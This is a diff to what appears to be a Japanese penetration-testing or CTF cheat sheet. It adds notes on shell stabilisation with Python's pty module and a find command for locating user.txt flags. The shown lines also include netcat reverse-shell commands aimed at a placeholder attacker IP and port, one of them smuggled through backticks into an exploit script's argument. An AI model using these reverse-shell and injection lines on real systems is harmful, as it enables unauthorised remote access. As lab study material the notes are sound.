@@ -235,13 +235,24 @@ nc -e /bin/sh <attackerIP> <attakerPort>
 
 
 # OneLinner
-Pythonのワンライナーでは、バッククオートを使う点に注意
+よくあるPythonのスクリプト
 ```
 python exploit.py --command `nc -e /bin/sh <attackerIP> <attackerPort>`
 ```
 
+リバースシェルをとったあとにシェルを安定させるためのPythonスクリプト
+ptyモジュールで擬似端末(pty)サブシステムへのインターフェースとやらを提供、これでシェルが安定する
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
 
 
+# Linuxコマンド
+/から再帰的に検索、-nameで、findの対象がファイルであることを指定、'user.txt'は'*.txt'のように正規表現も可能、2>de/nullは、標準エラー出力である2を、/dev/nullというLinuxのスペシャルファイル(そこに書き込まれたデータをすべて捨てる)に出力するコマンド。
+これにより、ログイン中のユーザ権限で閲覧可能なもののみ表示される。
+```
+find / -name 'user.txt' 2>/dev/null
+```
 
 
 
